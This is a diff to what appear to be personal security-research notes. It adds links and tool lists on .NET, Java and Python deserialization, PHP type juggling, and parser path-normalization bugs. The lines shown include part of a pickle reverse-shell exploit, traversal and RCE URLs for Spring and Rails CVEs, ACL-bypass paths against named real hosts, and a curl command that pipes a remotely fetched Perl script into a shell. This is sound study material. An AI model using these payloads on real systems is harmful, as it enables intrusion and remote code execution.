@@ -18,10 +18,13 @@
   - Pause
   - Debug > Windows > Modules
   - Right Click - Open All Modules
+  - <https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-dotnet-framework-source?view=vs-2019>
+  - <https://www.domstamand.com/debugging-your-dotnet-applications-and-packages-howto/>
 - Deserialization
   - Ref:
     - <https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf>
     - <https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf> 
+    - <https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization>
   - <https://github.com/pwntester/ysoserial.net>
   - System.Windows.Data.ObjectDataProvider <https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2>
     - Inherits DataSourceProvider
@@ -40,7 +43,9 @@
     - <https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs>
     - <https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations>
     - <http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html>
-
+  - Videos
+    - Alvaro Muñoz: .NET Serialization: Detecting and defending vulnerable endpoints: <https://www.youtube.com/watch?v=qDoBlLwREYk>
+    - 
 ## C / C++
 
 - Unsafe functions 
@@ -86,6 +91,50 @@
     exec "$PRGDIR"/"$EXECUTABLE" jpda start "$@"
     ```
 
+**Deserialization**
+
+- <https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet>
+- Decode serialized data: <https://github.com/NickstaDB/SerializationDumper>
+- <https://www.youtube.com/watch?v=KSA7vUkXGSg>
+- Deserialization: what, how and why [not] - Alexei Kojenov - AppSecUSA 2018: <https://www.youtube.com/watch?v=t-zVC-CxYjw>
+  - Very good basic introduction
+  - Death by deserialization: <https://youtu.be/t-zVC-CxYjw?t=1155>
+- Automated Discovery of Deserialization Gadget Chains: <https://www.youtube.com/watch?v=MTfE2OgUlKc>
+  - History of important sessions: <https://youtu.be/MTfE2OgUlKc?t=309>
+  - Basic example to magic methods (hashCode example)  to Gadget chains
+  - <https://github.com/JackOfMostTrades/gadgetinspector>
+  - Libraries
+    - Commons Collection: <https://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html>
+    - Conjure
+    - Scala-Library
+    - Conjure2
+- New Exploit Technique In Java Deserialization Attack: <https://www.youtube.com/watch?v=Lv9BC_bYaI8>
+  - ![](_assets/2021-01-20-03-42-40.png)
+  - CVE-2019-1040 - NTLM reflection attack
+  - CVE-2019-2426 - ntlm leaking
+- <https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html>
+- <https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html>
+- Defense
+  - Look ahead check 
+  - JEP290 - Filter Incoming Serialization Data
+  - Runtime application self protection (RASP)
+  - Java-Agent
+- Tools
+  - <https://github.com/JackOfMostTrades/gadgetinspector>
+    - Enum class hierarchy 
+    - Discover passthrough dataflow
+    - Enum passthrough callgraph 
+    - Enum source using known tricks  ( entry points into gadget-chains )
+      - HashCode
+      - DynamicProxy
+    - BFS on call graph for chains
+  - <https://github.com/frohoff/ysoserial>
+  - <https://github.com/mbechler/marshalsec>
+  - <https://github.com/Contrast-Security-OSS/joogle>
+  - <https://github.com/federicodotta/Java-Deserialization-Scanner>
+  - <https://github.com/nccgroup/freddy>
+
+
 **References**
 
 - LLJVM - running comparatively low level languages (such as C) on the JVM: [https://github.com/davidar/lljvm](https://github.com/davidar/lljvm)
@@ -95,6 +144,10 @@
   - <https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/>
   - <https://github.com/NickstaDB/DeserLab>
   - <https://github.com/NickstaDB/BaRMIe>
+  - JSF:
+    - <https://bitbucket.org/gebl/viewstatemesser/src/master/>
+    - <https://bitbucket.org/gebl/appseccali-jsf-el/src/master/>
+    - <https://github.com/frohoff/inspector-gadget>
 
 **New Technologies**
 
@@ -233,6 +286,7 @@ for i in range(len(c)):
   - HTB - DevOps
   - HTB - Challenge - Mics - Long Bottom's Locker
   - <https://www.hackingnote.com/en/python-challenge-solutions/level-5>
+- Pickle formats: <http://spootnik.org/entries/2014/04/05/diving-into-the-python-pickle-formatt/index.html>
 
 ```python
 #!/usr/bin/python3
@@ -277,6 +331,15 @@ evilpickle = cPickle.dumps(Payload(reverse_sh))
 
 r = requests.post('http://%s:%s/newpost' % (RHOST, RPORT), data=base64.urlsafe_b64encode(evilpickle))
 print('POST {} {}'.format(r.status_code, r.url))
+```
+
+Pickle to object:
+
+```python
+import pickle
+import base64 
+pickled = base64.b64decode("Value")
+pickle.load(pickled)
 ```
 
 ## PHP
@@ -401,6 +464,10 @@ Bypass: $string = "`ls -lah`";
 - Possible if `allow_url_include` is on
 
 #### Type Juggling
+
+- Magic hashes
+  - <https://www.whitehatsec.com/blog/magic-hashes/>
+  - <https://github.com/spaze/hashes>
 
 Fixed in v7 (except for exponent)
 References:
@@ -551,3 +618,63 @@ var_dump(md5('240610708') == md5('QNKCDZO')); ===> TRUE
         <t1>&wrapper;</t1>
     </root>
     ```
+
+## Breaking Parsers 
+
+- <https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf>
+- `new URL("file:///etc/passwd?/../../Windows/win.ini")`
+  - Windows: UNC: `//etc/passwd?/../../Windows/win.ini`
+  - Linux: URL: `file:///etc/passwd`
+- `replace` v.s. `replaceAll`
+- `..\Q/\E` is the new `../` in Grails
+- `/app/static/` v.s. `/app/static`
+  - Nginx:
+  - `location /static { alias /home/app/static/; }`
+  - In: `http://127.0.0.1/static../settings.py` 
+  - Out: `/home/app/static/../settings.py`
+    ```
+    200 http://target/assets/app.js
+    403 http://target/assets/
+    404 http://target/assets/../settings.py
+    403 http://target/assets../
+    200 http://target/assets../static/app.js
+    200 http://target/assets../settings.py
+    ```
+- Spring 0day - CVE-2018-1271
+  - ![](_assets/2020-11-26-09-20-46.png)
+  - `http://0:8080/spring-rabbit-stock/static/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/win.ini`
+- Spark framework CVE-2018-9159
+  - Same as Spring
+- Rails 0day - CVE-2018-3760
+  - Affected Rails under development environment 
+  - Or production mode with flag assets.compile on
+  - Vuln
+    - Sprockets supports file:// scheme that bypassed absolute_path?
+    - URL decode bypassed double slashes normalization
+    - Method split_file_uri resolved URI and unescape again
+    - Lead to double encoding and bypass forbidden_request? and prefix check
+  - `http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/etc/passwd`
+  - RCE: 
+    - Inject query string %3F to File URL
+    - Render as ERB template if the extension is .erb
+    - `http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/tmp/evil.erb%3ftype=text/plain`
+- URL path parameter
+  - if you are using reverse proxy with Java as backend service
+  - `http://example.com/foo;name=orange/bar/`
+  - ![](_assets/2020-11-26-09-31-57.png)
+  - Bypass whitelist and blacklist ACL
+  - Escape from context mapping
+  - `http://example.com/portal/..;/manager/html`
+    - Tomcat thinks it should look at parent directory 
+  - Example:
+    - Uber disallow direct access `*.uberinternal.com`
+    - Whitelisted API: `https://jira.uberinternal.com/status`
+    - Attack: `https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa`
+      - Nginx: `/..;/ seems to be a directory with the /status whitelist. Pass to you!`
+      - Tomcat: `/..;/ is the parent directory`
+  - Inconsistency to ACL bypass
+    - ![](_assets/2020-11-26-09-39-06.png)
+    - Changing the 404 template file to
+      - `/railo-context/../logs/exception.log`
+    - ![](_assets/2020-11-26-10-05-24.png)
+    - `curl https://login.getbynder.com/..;/railo-context/foo.cfm -d 'SHELL=-c "curl orange.tw/bc.pl | perl -"'`
